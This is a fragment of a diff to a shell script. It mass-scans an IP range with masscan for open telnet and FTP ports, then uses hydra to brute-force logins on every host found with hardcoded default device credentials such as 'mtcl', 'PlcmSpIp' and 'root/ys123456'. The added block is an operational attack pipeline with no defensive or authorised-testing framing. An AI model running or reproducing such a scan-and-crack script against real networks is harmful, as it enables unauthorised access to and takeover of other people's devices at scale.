@@ -21,7 +21,16 @@ cp -r ./hydra /usr/bin/hydra;
 cd ..;
 cd auto;
 
+==========================
+docker run --rm sha512sum/masscan --range $VAR1 --rate 20000 -p23,21 --open >> ip172.txt # Save port masscan Range 
+python3 fileformatter3.py # here we clean the brut file
+hydra -V -s 23 -M ip172.txt telnet -l mtcl -p mtcl -t2 -W4 -I >> results.txt # scan crack telnet
+hydra -V -s 21 -M ip172.txt ftp -l PlcmSpIp -p PlcmSpIp -t2 -W4 -I >> results.txt # scan crack ftp
+hydra -V -s 21 -M ip172.txt ftp -l root -p ys123456 -t2 -W4 -I >> results.txt # scan crack ftp
+rm ip172.txt # remove the temporary file
 
+------------------
+null password
 
 docker run --rm sha512sum/masscan --range $VAR1 --rate 20000 -p23,21 --open >> ip172.txt # Save port masscan Range 
 python3 fileformatter3.py # here we clean the brut file
